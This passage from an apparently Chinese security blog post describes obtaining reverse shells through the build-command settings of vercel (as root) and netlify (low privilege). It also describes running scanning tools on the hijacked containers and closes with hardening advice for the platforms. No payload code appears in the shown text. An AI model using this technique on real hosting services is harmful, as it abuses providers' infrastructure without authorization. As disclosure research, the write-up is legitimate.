</span></span></code></pre></div><p>构建日志很顺利，自动下载完成 nc 后反弹了 shell 且网站并没有阻拦，成功获得了一枚 shell，内核版本是 <code>4.14.262</code></p><p><img src="https://oss.zjun.info/zjun.info/202203151305359.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203151305359></p><p>通过多次的 shell 反弹，发现 IP 均是来自亚马逊云。这里相当于可以白嫖该容器资源，因为拥有最高权限，只是运行动态网站由于没弄清楚服务器与 vercel 之间的通讯原理，目前还没有实现，但是在其中运行一些代码还是绰绰有余。比如跑一个 <a href=https://github.com/ExpLangcn/FuYao target=_blank rel=noopener>FuYao</a>？</p><p><img src="https://oss.zjun.info/zjun.info/202203231749186.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203231749186></p><p><img src="https://oss.zjun.info/zjun.info/202203231750315.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203231750315></p><p>经查阅 <a href=https://vercel.com/docs/concepts/limits/overview target=_blank rel=noopener>vercel docs</a> 发现还是存在一些限制，比如我们只能在构建的时间中执行命令，每次部署的构建时间最长为 45 分钟，45 分钟后反弹的 shell 强制断开并构建日志报 Error 错误，其展示在前端的 output 目录在构建完成后才会生成。不反弹 shell 的前提下我们需要跑的脚本最好在 45 分钟内完成并将结果重定向到 output 目录下的文件中，这样能通过 vercel 提供的域名直接访问到结果，或者是不重定向，在构建日志中查看实时的返回结果，但是它只展示最后的 2000 行日志。</p><p><img src="https://oss.zjun.info/zjun.info/202203231750697.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203231750697></p><h2 id=低权限的-netlify-容器><a href=#低权限的-netlify-容器 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:低权限的-netlify-容器 class=headings>低权限的 netlify 容器</a></h2><p><a href=https://app.netlify.com/ target=_blank rel=noopener>netlify</a> 相信用过的师傅不在少数，基于上面的测试经历，我发现 netlify 没有过滤任何命令，但是容器给用户的权限很低。我在 <code>Build settings</code> 下面的 <code>Build command</code> 处填入反弹 shell 的 payload</p><p><img src="https://oss.zjun.info/zjun.info/202203161500117.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203161500117></p><p>一样地成功构建</p><p><img src="https://oss.zjun.info/zjun.info/202203161502888.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203161502888></p><p>并反弹回一个低权限的 shell，是 Ubuntu 系统，该容器可用命令也很多， 其 IP 来自亚马逊云。</p><p><img src="https://oss.zjun.info/zjun.info/202203161503285.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203161503285></p><p>总的来说 netlify 的容器由于权限较低而且内核版本也是 <code>5.4.149</code> 没办法提权，其中也可以跑一些脚本，但是没有 root 权限无法安装工具。</p><h2 id=思考><a href=#思考 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:思考 class=headings>思考</a></h2><p>4everland、vercel 给免费用户的使用权限应该仅是前端框架的部署与静态网站的托管服务，由于构建命令接口未做过滤处理导致注册用户可以执行任意命令且权限都是 root。对于这种情况应该结合用户自己选择的框架而仅提供该框架构建的相关命令，且应该以最低权限原则构建容器。对于拥有 root 容器权限来说，我们不仅仅能构建静态网站，拿到 root shell 后在其中跑一些脚本还是不错的。</p><p>终究还是可利用度不高，没办法横向访问到其他的容器或者逃逸，而且给用户的构建时间也是有限的，毕竟万一遇到死循环的构建指令，不可能一直占用容器资源。</p><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p>星际文件系统 (InterPlanetary File System)：<a href=https://ipfs.io/ target=_blank rel=noopener>https://ipfs.io/</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512" class="icon footnote-icon"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg></a></p></li><li id=fn:2><p>静态网站生成器，<a href=https://www.staticgen.com/ target=_blank rel=noopener>Static Site Generator</a>，简称 SSG。&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512" class="icon footnote-icon"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg></a></p></li></ol></div></div></article><div class=post-gitinfo><div class=post-gitinfo-left><div class="gitinfo-item commit"><a href=https://github.com/z1un/blog.zjun.info/commit/01a7eacf66139ffa4e2f6be85064f7fe7fd26650 target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" class="icon git-icon"><path d="M384 144c0-44.2-35.8-80-80-80s-80 35.8-80 80c0 36.4 24.3 67.1 57.5 76.8-.6 16.1-4.2 28.5-11 36.9-15.4 19.2-49.3 22.4-85.2 25.7-28.2 2.6-57.4 5.4-81.3 16.9v-144c32.5-10.2 56-40.5 56-76.3.0-44.2-35.8-80-80-80S0 35.8.0 80c0 35.8 23.5 66.1 56 76.3v199.3C23.5 365.9.0 396.2.0 432c0 44.2 35.8 80 80 80s80-35.8 80-80c0-34-21.2-63.1-51.2-74.6 3.1-5.2 7.8-9.8 14.9-13.4 16.2-8.2 40.4-10.4 66.1-12.8 42.2-3.9 90-8.4 118.2-43.4 14-17.4 21.1-39.8 21.6-67.9 31.6-10.8 54.4-40.7 54.4-75.9zM80 64c8.8.0 16 7.2 16 16s-7.2 16-16 16-16-7.2-16-16 7.2-16 16-16zm0 384c-8.8.0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16zm224-320c8.8.0 16 7.2 16 16s-7.2 16-16 16-16-7.2-16-16 7.2-16 16-16z"/></svg>01a7eac</a></div><div class="gitinfo-item commit-msg"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 512" class="icon msg-icon"><path d="M20 424.229h20V279.771H20c-11.046.0-20-8.954-20-20V212c0-11.046 8.954-20 20-20h112c11.046.0 20 8.954 20 20v212.229h20c11.046.0 20 8.954 20 20V492c0 11.046-8.954 20-20 20H20c-11.046.0-20-8.954-20-20v-47.771c0-11.046 8.954-20 20-20zM96 0C56.235.0 24 32.235 24 72s32.235 72 72 72 72-32.235 72-72S135.764.0 96 0z"/></svg>修复显示错误</div></div><div class=post-gitinfo-right><div class="gitinfo-item feedback"><a href=https://github.com/z1un/blog.zjun.info/issues target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" class="icon feedback-icon"><path d="M202.021.0C122.202.0 70.503 32.703 29.914 91.026c-7.363 10.58-5.093 25.086 5.178 32.874l43.138 32.709c10.373 7.865 25.132 6.026 33.253-4.148 25.049-31.381 43.63-49.449 82.757-49.449 30.764.0 68.816 19.799 68.816 49.631.0 22.552-18.617 34.134-48.993 51.164-35.423 19.86-82.299 44.576-82.299 106.405V320c0 13.255 10.745 24 24 24h72.471c13.255.0 24-10.745 24-24v-5.773c0-42.86 125.268-44.645 125.268-160.627C377.504 66.256 286.902.0 202.021.0zM192 373.459c-38.196.0-69.271 31.075-69.271 69.271.0 38.195 31.075 69.27 69.271 69.27s69.271-31.075 69.271-69.271-31.075-69.27-69.271-69.27z"/></svg>Feedback</a></div><div class="gitinfo-item edit"><a href=https://github.com/z1un/blog.zjun.info/blob/main/content/tech/%e9%9d%99%e6%80%81%e7%ab%99%e7%82%b9%e6%89%98%e7%ae%a1%e5%b9%b3%e5%8f%b0%e4%bb%85%e8%83%bd%e6%89%98%e7%ae%a1%e9%9d%99%e6%80%81%e8%b5%84%e6%ba%90%ef%bc%9f.md target=_blank rel=noopener><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon edit-icon"><path d="M402.3 344.9l32-32c5-5 13.7-1.5 13.7 5.7V464c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h273.5c7.1.0 10.7 8.6 5.7 13.7l-32 32c-1.5 1.5-3.5 2.3-5.7 2.3H48v352h352V350.5c0-2.1.8-4.1 2.3-5.6zm156.6-201.8L296.3 405.7l-90.4 10c-26.2 2.9-48.5-19.2-45.6-45.6l10-90.4L432.9 17.1c22.9-22.9 59.9-22.9 82.7.0l43.2 43.2c22.9 22.9 22.9 60 .1 82.8zM460.1 174 402 115.9 216.2 301.8l-7.3 65.3 65.3-7.3L460.1 174zm64.8-79.7-43.2-43.2c-4.1-4.1-10.8-4.1-14.8.0L436 82l58.1 58.1 30.9-30.9c4-4.2 4-10.8-.1-14.9z"/></svg>Edit Me?</a></div></div></div><div class=related-posts><h2 class=related-title>相关文章：</h2><ul class=related-list><li class=related-item><a href=/tech/cve-2021-3493/ class=related-link>CVE-2021-3493 Ubuntu OverlayFS 本地提权漏洞分析</a></li><li class=related-item><a href=/tech/cve-2022-0543/ class=related-link>CVE 2022 0543 Redis Lua 沙盒逃逸 RCE</a></li><li class=related-item><a href=/tech/cve-2022-0847/ class=related-link>CVE-2022-0847 Dirty Pipe Linux 内核提权漏洞</a></li><li class=related-item><a href=/tech/ms14-068/ class=related-link>MS14-068 (CVE-2014-6324) 域提权漏洞分析</a></li><li class=related-item><a href=/tech/bypass-domain-sensitive-group-acl-information-query/ class=related-link>Bypass 域敏感组访问控制信息查询</a></li></ul></div><footer class=minimal-footer><div class=post-tag><a href=/tags/4everland/ rel=tag class=post-tag-link>#4everland</a> <a href=/tags/vercel/ rel=tag class=post-tag-link>#vercel</a> <a href=/tags/netlify/ rel=tag class=post-tag-link>#netlify</a></div><div class=post-category><a href=/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ class=post-category-link>网络安全</a></div></footer><div class=load-comments><div id=load-comments>加载评论</div></div><div id=utterances></div></div></main><div id=back-to-top class=back-to-top><a href=#><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6.0-33.9L207 39c9.4-9.4 24.6-9.4 33.9.0l194.3 194.3c9.4 9.4 9.4 24.6.0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3.0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a></div><footer id=footer class=footer><div class=footer-inner><div class=site-info>©&nbsp;2019–2022&nbsp;zjun</div></div></footer></div><script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script><script>function loadComments(){(function(){var e,t=document.getElementById("utterances");if(!t)return;e=document.createElement('script'),e.src='https://utteranc.es/client.js',e.async=!0,e.crossOrigin='anonymous',e.setAttribute('repo','z1un/blog.zjun.info'),e.setAttribute('issue-term','title');const n=getCurrentTheme()==='dark';n?e.setAttribute('theme','photon-dark'):e.setAttribute('theme','github-light'),t.appendChild(e)})()}</script><script src=/js/medium-zoom.min.js></script>
<script>let imgNodes=document.querySelectorAll('div.post-body img');imgNodes=Array.from(imgNodes).filter(e=>e.parentNode.tagName!=="A"),mediumZoom(imgNodes,{background:'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'})</script></body></html>